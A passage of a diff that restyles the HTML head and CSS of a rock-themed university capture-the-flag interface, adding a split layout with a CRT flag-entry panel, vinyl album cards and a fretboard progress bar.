@@ -3,14 +3,15 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>The 27 Club CTF - Vintage Rock Room & Guitar Slide | Universidad de Cundinamarca</title>
+  <title>The 27 Club CTF - Vintage Rock Studio & Slide Highway | Universidad de Cundinamarca</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Permanent+Marker&family=Rajdhani:wght@500;600;700&family=VT323&display=swap" rel="stylesheet">
   <style>
     :root {
       --wood-dark: #0a0705;
-      --wood-med: #1a110c;
+      --wood-med: #16100c;
+      --wood-panel: #221610;
       --brass-gold: #c5a059;
       --brass-light: #f3d48d;
       --aged-cream: #f4ece1;
@@ -19,14 +20,9 @@
       --amber-warm: #e09f3e;
       --amber-bright: #ffb703;
       --crt-green: #33ff33;
-      --crt-amber: #ffb000;
-      --fender-tweed: #8c7355;
-      --fiesta-red: #c93a2b;
+      --crt-glow: rgba(51, 255, 51, 0.4);
       --danger-rust: #9e2a2b;
       --success-olive: #588157;
-      --chrome-hi: #ffffff;
-      --chrome-mid: #a0aab2;
-      --chrome-dark: #3a4249;
     }
 
     * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
@@ -40,20 +36,19 @@
       color: var(--aged-cream);
     }
 
-    /* TOP MASTER HUD CONSOLE */
+    /* TOP MASTER HUD */
     #top-hud {
       position: absolute;
       top: 0; left: 0; right: 0;
-      height: 60px;
-      background: linear-gradient(180deg, rgba(10, 7, 5, 0.96) 0%, rgba(20, 14, 10, 0.88) 100%);
-      border-bottom: 2px solid rgba(197, 160, 89, 0.35);
+      height: 56px;
+      background: linear-gradient(180deg, rgba(12, 8, 6, 0.98) 0%, rgba(20, 14, 10, 0.95) 100%);
+      border-bottom: 2px solid rgba(197, 160, 89, 0.4);
       box-shadow: 0 4px 20px rgba(0,0,0,0.85);
       z-index: 100;
       display: flex;
       align-items: center;
       justify-content: space-between;
       padding: 0 16px;
-      backdrop-filter: blur(8px);
     }
 
     .brand-section {
@@ -61,23 +56,21 @@
       align-items: center;
       gap: 12px;
     }
-
-    .brand-logo-disc {
-      width: 40px;
-      height: 40px;
+    .brand-disc {
+      width: 38px;
+      height: 38px;
       border-radius: 50%;
       background: radial-gradient(circle, #333 15%, #111 40%, #000 70%, #222 100%);
       border: 2px solid var(--brass-gold);
-      box-shadow: 0 0 10px rgba(197, 160, 89, 0.4);
       display: flex;
       align-items: center;
       justify-content: center;
       animation: spinVinyl 6s linear infinite;
     }
-    .brand-logo-disc::after {
+    .brand-disc::after {
       content: "27";
       font-family: 'Permanent Marker', cursive;
-      font-size: 15px;
+      font-size: 14px;
       color: var(--amber-bright);
     }
     @keyframes spinVinyl { 100% { transform: rotate(360deg); } }
@@ -85,30 +78,29 @@
     .brand-titles h1 {
       font-family: 'Permanent Marker', cursive;
       font-size: 18px;
-      letter-spacing: 1px;
       color: var(--brass-light);
-      text-shadow: 0 2px 6px rgba(0,0,0,0.8);
       line-height: 1.1;
+      letter-spacing: 0.8px;
     }
-    .brand-titles .sub-title {
-      font-size: 11px;
+    .brand-titles .sub {
+      font-size: 10px;
       letter-spacing: 1.5px;
       color: var(--text-muted);
       text-transform: uppercase;
       font-weight: 600;
     }
 
-    /* Telemetry Stats */
-    .telemetry-bar {
+    /* Telemetry HUD */
+    .telemetry-row {
       display: flex;
       align-items: center;
-      gap: 18px;
-      background: rgba(15, 10, 7, 0.7);
-      padding: 6px 16px;
+      gap: 16px;
+      background: rgba(0,0,0,0.45);
+      padding: 4px 14px;
       border-radius: 6px;
       border: 1px solid rgba(197, 160, 89, 0.25);
     }
-    .telem-item {
+    .telem-box {
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -117,25 +109,25 @@
     .telem-lbl {
       font-size: 9px;
       text-transform: uppercase;
-      letter-spacing: 1.2px;
+      letter-spacing: 1px;
       color: var(--text-muted);
       font-weight: 700;
     }
     .telem-val {
       font-family: 'Fira Code', monospace;
-      font-size: 14px;
+      font-size: 13px;
       font-weight: 700;
       color: var(--brass-light);
     }
     .telem-val.accent { color: var(--amber-bright); }
 
-    /* Audio Equalizer & Track Indicator */
-    .audio-telemetry {
+    /* Audio Equalizer & Track */
+    .audio-now-playing {
       display: flex;
       align-items: center;
       gap: 10px;
       background: rgba(0,0,0,0.5);
-      border: 1px solid rgba(197, 160, 89, 0.2);
+      border: 1px solid rgba(197, 160, 89, 0.25);
       padding: 4px 12px;
       border-radius: 20px;
     }
@@ -143,11 +135,11 @@
       display: flex;
       align-items: flex-end;
       gap: 2px;
-      height: 16px;
+      height: 15px;
     }
     .eq-bar {
       width: 3px;
-      height: 6px;
+      height: 4px;
       background: var(--amber-bright);
       border-radius: 1px;
     }
@@ -155,478 +147,432 @@
     .eq-bars.playing .eq-bar:nth-child(2) { animation: eqJump 0.6s infinite alternate ease-in-out 0.1s; }
     .eq-bars.playing .eq-bar:nth-child(3) { animation: eqJump 0.3s infinite alternate ease-in-out 0.2s; }
     .eq-bars.playing .eq-bar:nth-child(4) { animation: eqJump 0.5s infinite alternate ease-in-out 0.15s; }
-    @keyframes eqJump { 0% { height: 3px; } 100% { height: 16px; } }
+    @keyframes eqJump { 0% { height: 3px; } 100% { height: 15px; } }
 
-    .track-name {
+    .track-title {
       font-family: 'Fira Code', monospace;
       font-size: 11px;
       color: var(--aged-paper);
-      max-width: 140px;
+      max-width: 130px;
       white-space: nowrap;
       overflow: hidden;
       text-overflow: ellipsis;
     }
 
-    /* Camera Switcher Buttons */
-    .view-switcher {
-      display: flex;
-      gap: 6px;
-    }
-    .btn-view {
+    .btn-top {
       background: rgba(26, 17, 12, 0.85);
       border: 1px solid rgba(197, 160, 89, 0.4);
-      color: var(--aged-paper);
-      padding: 6px 12px;
-      border-radius: 4px;
-      font-size: 11px;
-      font-weight: 700;
-      letter-spacing: 0.8px;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      transition: all 0.25s ease;
-    }
-    .btn-view:hover, .btn-view.active {
-      background: linear-gradient(180deg, var(--amber-warm) 0%, #b87a1d 100%);
-      color: #000;
-      border-color: var(--amber-bright);
-      box-shadow: 0 0 10px rgba(224, 159, 62, 0.5);
-    }
-
-    /* Actions: Drawer, Reset, Sustentación */
-    .hud-actions {
-      display: flex;
-      gap: 6px;
-    }
-    .btn-action {
-      background: rgba(30, 20, 15, 0.9);
-      border: 1px solid rgba(197, 160, 89, 0.4);
       color: var(--brass-light);
-      padding: 6px 11px;
+      padding: 5px 12px;
       border-radius: 4px;
       font-size: 11px;
       font-weight: 700;
       cursor: pointer;
-      transition: all 0.2s ease;
+      transition: all 0.2s;
     }
-    .btn-action:hover {
+    .btn-top:hover {
       background: var(--brass-gold);
       color: #000;
     }
-    .btn-action.demo-btn {
+    .btn-top.accent {
       border-color: var(--amber-bright);
       color: var(--amber-bright);
     }
-    .btn-action.demo-btn:hover {
+    .btn-top.accent:hover {
       background: var(--amber-bright);
       color: #000;
     }
 
-    /* MASTER STAGE VIEWPORT */
-    #stage-viewport {
+    /* MAIN APP WORKSPACE (SPLIT LAYOUT: CLEAN BEDROOM ON LEFT, STRATEGIC KALI RACK ON RIGHT) */
+    #main-workspace {
       position: absolute;
-      top: 60px;
+      top: 56px;
       left: 0;
       right: 0;
-      bottom: 80px;
+      bottom: 84px;
+      display: flex;
       overflow: hidden;
+      background: #080605;
+    }
+
+    /* LEFT: CLEAN UNCLUTTERED VINTAGE ROCK ROOM */
+    #room-pane {
+      flex: 1;
+      height: 100%;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
       background: #000;
-      display: flex;
-      align-items: center;
-      justify-content: center;
     }
-
-    #stage-canvas-wrap {
-      position: relative;
-      width: 1024px;
-      height: 571px;
-      max-width: 100%;
-      max-height: 100%;
-      aspect-ratio: 1024 / 571;
-      transform-origin: center center;
-      transition: transform 0.85s cubic-bezier(0.2, 0.8, 0.2, 1);
-    }
-
-    /* Master Photo Layer */
-    #master-photo {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      object-fit: cover;
-      pointer-events: none;
-      box-shadow: 0 0 50px rgba(0,0,0,0.9);
-    }
-
-    /* Cinematic Vignette & Lighting Filter */
-    #lighting-overlay {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      pointer-events: none;
-      background: radial-gradient(circle at 75% 20%, rgba(255, 230, 180, 0.08) 0%, rgba(10, 6, 4, 0.25) 50%, rgba(0, 0, 0, 0.75) 100%);
-      mix-blend-mode: multiply;
-    }
-
-    /* INTERACTIVE ELEMENTS ON THE REAL PHOTO */
-    /* 1. GUITAR NECK & 27 FRETS OVERLAY */
-    #neck-overlay {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      pointer-events: none;
-    }
-
-    /* Interactive Fret Nodes (Clickable for Inspection) */
-    .fret-hotspot {
-      position: absolute;
-      width: 14px;
-      height: 28px;
-      transform: translate(-50%, -50%) rotate(68.85deg);
-      cursor: pointer;
-      pointer-events: auto;
-      border-radius: 2px;
-      transition: all 0.2s ease;
-      z-index: 20;
-    }
-    .fret-hotspot:hover {
-      background: rgba(255, 183, 3, 0.35);
-      box-shadow: 0 0 8px var(--amber-bright);
-    }
-    .fret-hotspot.milestone {
-      border: 1px solid rgba(197, 160, 89, 0.6);
-      background: rgba(197, 160, 89, 0.15);
-    }
-    .fret-hotspot.unlocked {
-      border-color: var(--amber-bright);
-      background: rgba(255, 183, 3, 0.3);
-      box-shadow: 0 0 10px rgba(255, 183, 3, 0.6);
-    }
-
-    /* Fret Number Tooltip */
-    .fret-hotspot .fret-badge {
-      position: absolute;
-      top: -18px;
-      left: 50%;
-      transform: translateX(-50%) rotate(-68.85deg);
-      background: rgba(10, 7, 5, 0.9);
-      border: 1px solid var(--brass-gold);
-      color: var(--brass-light);
-      font-family: 'Fira Code', monospace;
-      font-size: 8px;
-      padding: 1px 3px;
-      border-radius: 2px;
-      white-space: nowrap;
-      opacity: 0;
-      transition: opacity 0.2s ease;
-      pointer-events: none;
-    }
-    .fret-hotspot:hover .fret-badge,
-    .fret-hotspot.active-fret .fret-badge {
-      opacity: 1;
-    }
-
-    /* THE CHROME STEEL GUITAR SLIDE (BOTTLENECK) */
-    #chrome-slide {
-      position: absolute;
-      width: 32px;
-      height: 12px;
-      margin-left: -16px;
-      margin-top: -6px;
-      transform: rotate(68.85deg);
-      pointer-events: none;
-      z-index: 35;
-      /* Authentic Cylindrical Polished Steel Gradient */
-      background: linear-gradient(180deg, 
-        #25292e 0%, 
-        #7c858e 15%, 
-        #ffffff 45%, 
-        #f0f4f8 55%, 
-        #828d97 78%, 
-        #1e2226 100%
-      );
-      border-radius: 4px;
-      box-shadow: 
-        0 4px 10px rgba(0, 0, 0, 0.85),
-        0 0 14px rgba(255, 255, 255, 0.5),
-        inset 0 1px 2px rgba(255, 255, 255, 0.9),
-        inset 0 -1px 2px rgba(0, 0, 0, 0.8);
-      transition: left 0.75s cubic-bezier(0.25, 1, 0.5, 1), top 0.75s cubic-bezier(0.25, 1, 0.5, 1);
-    }
-    /* Chrome Reflection Glint Flare */
-    #chrome-slide::after {
-      content: "";
-      position: absolute;
-      top: 2px;
-      left: 10px;
-      width: 12px;
-      height: 2px;
-      background: #ffffff;
-      border-radius: 2px;
-      filter: blur(0.5px);
-      box-shadow: 0 0 6px #ffffff;
-      animation: chromeGlint 2.5s infinite alternate ease-in-out;
-    }
-    @keyframes chromeGlint {
-      0% { opacity: 0.6; transform: scaleX(0.8); }
-      100% { opacity: 1; transform: scaleX(1.3); }
-    }
-
-    /* Strings harmonic glow under slide */
-    #slide-glow {
-      position: absolute;
-      width: 44px;
-      height: 44px;
-      margin-left: -22px;
-      margin-top: -22px;
-      border-radius: 50%;
-      background: radial-gradient(circle, rgba(255, 183, 3, 0.45) 0%, rgba(224, 159, 62, 0.15) 50%, transparent 75%);
-      pointer-events: none;
-      z-index: 25;
-      transition: left 0.75s cubic-bezier(0.25, 1, 0.5, 1), top 0.75s cubic-bezier(0.25, 1, 0.5, 1);
-    }
-
-    /* 2. REAL 12" VINYL LP SLEEVE CARDS ON THE BED */
-    .vinyl-sleeve-card {
-      position: absolute;
-      cursor: pointer;
-      pointer-events: auto;
-      z-index: 18;
-      transition: transform 0.35s cubic-bezier(0.2, 0.8, 0.2, 1), box-shadow 0.35s ease, filter 0.3s ease;
-      filter: drop-shadow(4px 10px 18px rgba(0,0,0,0.85));
-    }
-
-    .vinyl-sleeve-card:hover {
-      transform: scale(1.18) !important;
-      z-index: 60 !important;
-      filter: drop-shadow(6px 16px 28px rgba(0,0,0,0.95)) brightness(1.08);
-    }
-
-    .sleeve-jacket {
-      position: relative;
-      width: 100%;
-      height: 100%;
-      border-radius: 4px;
-      overflow: hidden;
-      background: #110e0c;
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      box-shadow: inset 0 0 10px rgba(0,0,0,0.6);
-      transition: border-color 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    .album-cover-img {
+    #clean-room-image {
       width: 100%;
       height: 100%;
       object-fit: cover;
+      object-position: center;
       display: block;
-      transition: filter 0.3s ease;
-    }
-
-    /* Cardboard Ring Wear (Vintage circle wear mark) */
-    .ring-wear-effect {
-      position: absolute;
-      inset: 6%;
-      border-radius: 50%;
-      border: 1px solid rgba(255, 255, 255, 0.16);
-      box-shadow: inset 0 0 16px rgba(255, 255, 255, 0.12), 0 0 16px rgba(255, 255, 255, 0.08);
       pointer-events: none;
-      mix-blend-mode: overlay;
     }
-
-    /* Ribbon Label */
-    .sleeve-status-ribbon {
+    /* Subtle warm lighting vignette */
+    #room-vignette {
       position: absolute;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      background: linear-gradient(180deg, rgba(10, 7, 5, 0.82) 0%, rgba(5, 3, 2, 0.96) 100%);
-      color: var(--brass-light);
-      font-family: 'Permanent Marker', cursive;
-      font-size: 9px;
-      padding: 3px 6px;
-      text-align: center;
-      border-top: 1px solid rgba(197, 160, 89, 0.4);
-      letter-spacing: 0.5px;
-      text-shadow: 0 1px 3px #000;
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
-    }
-
-    /* The Vinyl Disc Peeking Out */
-    .vinyl-disc-peeking {
-      position: absolute;
-      top: 5%;
-      right: -20px;
-      width: 90%;
-      height: 90%;
-      border-radius: 50%;
-      background: radial-gradient(circle, #2a2a2a 18%, #111111 38%, #050505 55%, #181818 72%, #080808 100%);
-      box-shadow: 
-        0 4px 12px rgba(0,0,0,0.8),
-        inset 0 0 0 2px #222,
-        inset 0 0 0 5px #151515,
-        inset 0 0 0 8px #252525;
-      z-index: -1;
+      inset: 0;
+      background: radial-gradient(circle at 60% 40%, transparent 40%, rgba(10, 6, 4, 0.6) 85%, rgba(0, 0, 0, 0.85) 100%);
       pointer-events: none;
-      transition: right 0.5s cubic-bezier(0.2, 0.8, 0.2, 1), transform 0.5s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
     }
 
-    .disc-label {
-      width: 34%;
-      height: 34%;
-      border-radius: 50%;
-      background-size: cover;
-      background-position: center;
-      border: 1px solid rgba(197, 160, 89, 0.6);
-      box-shadow: inset 0 0 4px #000;
-    }
-
-    /* Active Phase State */
-    .vinyl-sleeve-card.active-phase .sleeve-jacket {
-      border: 2px solid var(--amber-bright);
-      box-shadow: 0 0 25px rgba(255, 183, 3, 0.75), inset 0 0 15px rgba(255, 183, 3, 0.3);
-    }
-    .vinyl-sleeve-card.active-phase .sleeve-status-ribbon {
-      background: linear-gradient(180deg, var(--amber-bright) 0%, #b87a1d 100%);
-      color: #000;
-      font-weight: 700;
-    }
-    .vinyl-sleeve-card.active-phase .vinyl-disc-peeking {
-      right: -36px;
-    }
-
-    /* Completed Phase State (Flag Captured) */
-    .vinyl-sleeve-card.completed-phase .sleeve-jacket {
-      border: 2px solid var(--success-olive);
-      box-shadow: 0 0 20px rgba(88, 129, 87, 0.7);
-    }
-    .vinyl-sleeve-card.completed-phase .sleeve-status-ribbon {
-      background: linear-gradient(180deg, #588157 0%, #31572c 100%);
-      color: #fff;
-    }
-    .vinyl-sleeve-card.completed-phase .vinyl-disc-peeking {
-      right: -42px;
-      animation: spinVinyl 6s linear infinite;
-    }
-
-    /* 3. TURNTABLE HOTSPOT */
-    #turntable-hotspot {
+    /* Fender Amp Pilot Jewel (Interactive Sound trigger) */
+    #room-amp-clicker {
       position: absolute;
-      left: 410px;
-      top: 140px;
-      width: 105px;
-      height: 95px;
+      right: 17%;
+      bottom: 12%;
+      width: 70px;
+      height: 70px;
       cursor: pointer;
-      pointer-events: auto;
-      z-index: 15;
-      border-radius: 6px;
-    }
-    #turntable-hotspot:hover {
-      box-shadow: inset 0 0 15px rgba(255, 183, 3, 0.4);
-    }
-
-    /* 4. FENDER AMPLIFIER HOTSPOT & PILOT LAMP */
-    #amp-hotspot {
-      position: absolute;
-      left: 710px;
-      top: 420px;
-      width: 105px;
-      height: 90px;
-      cursor: pointer;
-      pointer-events: auto;
-      z-index: 15;
-    }
-    #fender-pilot-light {
-      position: absolute;
-      left: 728px;
-      top: 456px;
-      width: 7px;
-      height: 7px;
       border-radius: 50%;
-      background: #ff2222;
-      box-shadow: 0 0 8px #ff0000;
+      z-index: 10;
+    }
+    #amp-jewel-lamp {
+      position: absolute;
+      right: 19.5%;
+      bottom: 17%;
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+      background: #ff1111;
+      box-shadow: 0 0 10px #ff0000;
       pointer-events: none;
-      z-index: 25;
-      animation: ampValveGlow 3s infinite alternate ease-in-out;
+      z-index: 12;
+      animation: jewelBreath 3s infinite alternate;
     }
-    @keyframes ampValveGlow {
-      0% { opacity: 0.75; box-shadow: 0 0 5px #ff0000; }
-      100% { opacity: 1; box-shadow: 0 0 12px #ff3333, 0 0 20px rgba(255,0,0,0.5); }
+    @keyframes jewelBreath {
+      0% { opacity: 0.7; box-shadow: 0 0 6px #ff0000; }
+      100% { opacity: 1; box-shadow: 0 0 16px #ff3333, 0 0 25px rgba(255,0,0,0.5); }
     }
-    #fender-pilot-light.fender-alert {
+    #amp-jewel-lamp.snap-alert {
       background: #ff0000;
-      box-shadow: 0 0 25px #ff0000, 0 0 45px #ff0000;
-      animation: ampAlertBlink 0.1s infinite alternate;
+      box-shadow: 0 0 35px #ff0000, 0 0 60px #ff0000;
+      animation: snapBlink 0.1s infinite alternate;
     }
-    @keyframes ampAlertBlink {
-      0% { opacity: 0.2; }
-      100% { opacity: 1; }
-    }
+    @keyframes snapBlink { 0% { opacity: 0.1; } 100% { opacity: 1; } }
 
-    /* 5. VINTAGE CRT TELEVISION HOTSPOT */
-    #crt-hotspot {
-      position: absolute;
-      left: 890px;
-      top: 270px;
-      width: 120px;
-      height: 180px;
-      cursor: pointer;
-      pointer-events: auto;
-      z-index: 15;
-    }
-    #crt-screen-overlay {
-      position: absolute;
-      left: 903px;
-      top: 295px;
-      width: 82px;
-      height: 64px;
-      background: rgba(10, 25, 10, 0.88);
-      border-radius: 6px;
-      overflow: hidden;
-      pointer-events: none;
-      z-index: 20;
-      box-shadow: inset 0 0 10px rgba(0,0,0,0.9), 0 0 8px rgba(51, 255, 51, 0.35);
-      border: 1px solid rgba(51, 255, 51, 0.4);
+    /* RIGHT: STRATEGIC STUDIO RACK (CRT MONITOR KALI + VINYL SANCTUARIES) */
+    #studio-rack-pane {
+      width: 460px;
+      height: 100%;
+      background: linear-gradient(180deg, #18110b 0%, #100b07 100%);
+      border-left: 2px solid var(--brass-gold);
+      box-shadow: -8px 0 30px rgba(0,0,0,0.85);
       display: flex;
       flex-direction: column;
-      padding: 3px;
+      z-index: 20;
     }
-    #crt-screen-overlay::before {
+
+    /* 1. STRATEGIC CRT KALI MONITOR */
+    #crt-monitor-section {
+      padding: 14px;
+      background: #0f0a07;
+      border-bottom: 2px solid rgba(197, 160, 89, 0.35);
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .crt-monitor-housing {
+      background: #040804;
+      border: 3px solid #2d382d;
+      border-radius: 8px;
+      padding: 12px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: inset 0 0 20px rgba(0,0,0,0.9), 0 4px 15px rgba(0,0,0,0.7);
+    }
+    /* CRT Scanlines */
+    .crt-monitor-housing::before {
       content: "";
       position: absolute;
       inset: 0;
-      background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.4) 50%);
+      background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.45) 50%);
       background-size: 100% 3px;
       pointer-events: none;
       z-index: 5;
     }
-    .crt-mini-text {
+    .crt-header-line {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px dashed rgba(51, 255, 51, 0.4);
+      padding-bottom: 4px;
+      margin-bottom: 8px;
+    }
+    .crt-title {
       font-family: 'VT323', monospace;
-      font-size: 8px;
-      line-height: 1.1;
+      font-size: 18px;
       color: var(--crt-green);
-      text-shadow: 0 0 4px var(--crt-green);
+      text-shadow: 0 0 6px var(--crt-green);
+      letter-spacing: 1px;
     }
-    .crt-blink-cursor {
-      display: inline-block;
-      width: 4px;
-      height: 7px;
+    .crt-live-badge {
+      font-family: 'Fira Code', monospace;
+      font-size: 10px;
+      color: #000;
       background: var(--crt-green);
-      animation: crtBlink 0.8s infinite;
+      padding: 1px 5px;
+      border-radius: 2px;
+      font-weight: 700;
     }
-    @keyframes crtBlink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
 
-    /* BOTTOM INTERACTIVE MACRO FRETBOARD HIGHWAY */
-    #bottom-macro-bar {
+    .crt-body {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      font-family: 'VT323', monospace;
+      font-size: 15px;
+      color: var(--crt-green);
+      text-shadow: 0 0 4px var(--crt-glow);
+      line-height: 1.2;
+    }
+    .crt-row {
+      display: flex;
+      gap: 8px;
+    }
+    .crt-lbl { color: #88ff88; min-width: 80px; }
+    .crt-val { color: #ffffff; }
+    .crt-val.code { color: #ffeb3b; font-family: 'Fira Code', monospace; font-size: 10px; }
+
+    /* Flag Input in CRT Terminal */
+    .crt-flag-form {
+      margin-top: 6px;
+      border-top: 1px dashed rgba(51, 255, 51, 0.35);
+      padding-top: 8px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+    .flag-terminal-input-wrap {
+      display: flex;
+      gap: 6px;
+    }
+    .flag-terminal-input {
+      flex: 1;
+      background: #000;
+      border: 1px solid var(--crt-green);
+      color: var(--crt-green);
+      font-family: 'Fira Code', monospace;
+      font-size: 12px;
+      padding: 6px 8px;
+      border-radius: 4px;
+      outline: none;
+      box-shadow: inset 0 0 6px rgba(51, 255, 51, 0.2);
+    }
+    .flag-terminal-input:focus {
+      box-shadow: 0 0 10px var(--crt-green);
+    }
+    .btn-crt-submit {
+      background: var(--crt-green);
+      color: #000;
+      border: none;
+      font-family: 'VT323', monospace;
+      font-size: 18px;
+      font-weight: 700;
+      padding: 0 14px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .btn-crt-submit:hover {
+      background: #ffffff;
+      box-shadow: 0 0 12px #ffffff;
+    }
+
+    .crt-feedback-msg {
+      font-family: 'Fira Code', monospace;
+      font-size: 10px;
+      padding: 4px 6px;
+      border-radius: 3px;
+      display: none;
+      line-height: 1.2;
+    }
+    .crt-feedback-msg.success {
+      display: block;
+      background: rgba(88, 129, 87, 0.3);
+      border: 1px solid var(--success-olive);
+      color: #86efac;
+    }
+    .crt-feedback-msg.error {
+      display: block;
+      background: rgba(158, 42, 43, 0.3);
+      border: 1px solid var(--danger-rust);
+      color: #fca5a5;
+    }
+
+    /* 2. THE 5 VINYL SANCTUARIES (REVEALED AS FLAGS ARE DISCOVERED) */
+    #vinyl-showcase-section {
+      flex: 1;
+      overflow-y: auto;
+      padding: 12px 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    #vinyl-showcase-section::-webkit-scrollbar { width: 5px; }
+    #vinyl-showcase-section::-webkit-scrollbar-thumb { background: var(--brass-gold); border-radius: 3px; }
+
+    .showcase-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .showcase-header h2 {
+      font-family: 'Permanent Marker', cursive;
+      font-size: 14px;
+      color: var(--brass-light);
+      letter-spacing: 0.5px;
+    }
+    .showcase-header .count {
+      font-family: 'Fira Code', monospace;
+      font-size: 11px;
+      color: var(--amber-bright);
+    }
+
+    /* 5 Vinyl Cards in Showcase */
+    .sanctuary-slot-card {
+      background: rgba(10, 7, 5, 0.85);
+      border: 1px solid rgba(197, 160, 89, 0.25);
+      border-radius: 6px;
+      padding: 8px 10px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      position: relative;
+      overflow: hidden;
+      transition: all 0.3s ease;
+      cursor: pointer;
+    }
+    .sanctuary-slot-card:hover {
+      border-color: var(--amber-bright);
+      background: rgba(20, 14, 10, 0.95);
+    }
+
+    /* Active phase glow */
+    .sanctuary-slot-card.active {
+      border-color: var(--amber-bright);
+      box-shadow: 0 0 15px rgba(255, 183, 3, 0.35);
+      background: rgba(30, 20, 14, 0.9);
+    }
+    /* Completed / Unlocked Cover */
+    .sanctuary-slot-card.unlocked {
+      border-color: var(--success-olive);
+      box-shadow: 0 0 14px rgba(88, 129, 87, 0.4);
+    }
+
+    /* Album Cover Artwork Container */
+    .slot-jacket-art {
+      width: 64px;
+      height: 64px;
+      border-radius: 4px;
+      position: relative;
+      flex-shrink: 0;
+      background: #000;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      overflow: hidden;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.8);
+    }
+    .slot-jacket-art img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      transition: filter 0.3s ease, opacity 0.3s ease;
+    }
+    /* Locked state cover silhouette / mystery overlay */
+    .slot-jacket-art.locked img {
+      filter: grayscale(1) brightness(0.25) contrast(1.2);
+      opacity: 0.4;
+    }
+    .slot-lock-icon {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      color: var(--brass-light);
+      background: rgba(0, 0, 0, 0.4);
+    }
+    .slot-jacket-art.unlocked .slot-lock-icon { display: none; }
+
+    /* Peeking vinyl disc on unlocked card */
+    .slot-spinning-disc {
+      position: absolute;
+      right: -15px;
+      top: 5px;
+      width: 54px;
+      height: 54px;
+      border-radius: 50%;
+      background: radial-gradient(circle, #333 20%, #111 40%, #000 65%, #222 100%);
+      box-shadow: 0 0 8px rgba(0,0,0,0.9);
+      display: none;
+      z-index: -1;
+    }
+    .sanctuary-slot-card.unlocked .slot-spinning-disc {
+      display: block;
+      animation: spinVinyl 5s linear infinite;
+    }
+
+    .slot-info-box {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+    .slot-title-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .slot-artist-name {
+      font-family: 'Permanent Marker', cursive;
+      font-size: 14px;
+      color: var(--aged-paper);
+    }
+    .sanctuary-slot-card.active .slot-artist-name { color: var(--amber-bright); }
+    .sanctuary-slot-card.unlocked .slot-artist-name { color: #86efac; }
+
+    .slot-traste-tag {
+      font-family: 'Fira Code', monospace;
+      font-size: 10px;
+      color: var(--brass-light);
+      background: rgba(197, 160, 89, 0.15);
+      border: 1px solid var(--brass-gold);
+      padding: 1px 5px;
+      border-radius: 3px;
+    }
+
+    .slot-track-title {
+      font-size: 11px;
+      color: var(--text-muted);
+    }
+    .sanctuary-slot-card.unlocked .slot-track-title {
+      color: var(--brass-light);
+      font-weight: 600;
+    }
+
+    .slot-vector-cwe {
+      font-family: 'Fira Code', monospace;
+      font-size: 9px;
+      color: var(--text-muted);
+      margin-top: 2px;
+    }
+
+    /* BOTTOM INTERACTIVE MACRO DIAPASÓN HIGHWAY (27 FRETS + SLIDE GLISSANDO) */
+    #bottom-macro-fretboard {
       position: absolute;
       left: 0; right: 0; bottom: 0;
-      height: 80px;
-      background: linear-gradient(180deg, rgba(20, 14, 10, 0.95) 0%, rgba(10, 7, 5, 0.99) 100%);
-      border-top: 2px solid rgba(197, 160, 89, 0.4);
+      height: 84px;
+      background: linear-gradient(180deg, rgba(22, 16, 12, 0.98) 0%, rgba(10, 7, 5, 0.99) 100%);
+      border-top: 2px solid var(--brass-gold);
       box-shadow: 0 -4px 25px rgba(0,0,0,0.9);
       z-index: 90;
       display: flex;
@@ -634,39 +580,55 @@
       padding: 4px 16px;
     }
 
-    .macro-bar-header {
+    .fret-bar-top-info {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      height: 22px;
+      height: 20px;
       font-size: 11px;
       letter-spacing: 1px;
       color: var(--text-muted);
       text-transform: uppercase;
     }
-    .macro-bar-header .title {
+    .fret-bar-top-info .brand {
       font-family: 'Permanent Marker', cursive;
       color: var(--brass-light);
       font-size: 13px;
     }
 
-    .fretboard-strip {
+    .diapason-strip {
       flex: 1;
       display: flex;
       align-items: center;
       position: relative;
-      background: #140d09;
-      border: 1px solid rgba(197, 160, 89, 0.25);
+      background: #150e09;
+      border: 1px solid rgba(197, 160, 89, 0.35);
       border-radius: 4px;
       overflow: hidden;
       margin-top: 2px;
     }
 
-    /* Wooden Grain Texture & Frets */
-    .fret-strip-item {
+    /* 6 Realistic Guitar Strings */
+    .fret-string {
+      position: absolute;
+      left: 0; right: 0;
+      pointer-events: none;
+      z-index: 2;
